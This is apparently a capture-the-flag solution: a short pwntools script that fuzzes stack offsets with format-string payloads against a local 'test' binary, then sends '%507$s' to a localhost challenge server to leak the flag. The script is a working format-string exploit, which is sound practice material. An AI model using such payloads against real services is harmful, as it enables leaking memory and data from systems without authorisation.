# Solution

1. Need to do some form of socket programming. Following code requires pwntools to be installed:
```py
from pwn import *

context.update(arch='i386',os='linux')

def fuzzing():
    for i in range(2000):
        try:   
            io = process("./test")
            data = "%" + str(i) + "$s" 
            io.sendline(data.encode())
            
            recv_data = io.recvuntil(b'}')
            if len(recv_data) != 0:
                print("Stack Index: "+ str(i))
                print("=================")
                print(recv_data)
                print("\n\n=================")
        except EOFError:
            continue

def solve():
    server_ip = "localhost"
    con = remote(server_ip,7732)
    con.sendline(b'%507$s')
    print(con.recvall())

solve()
```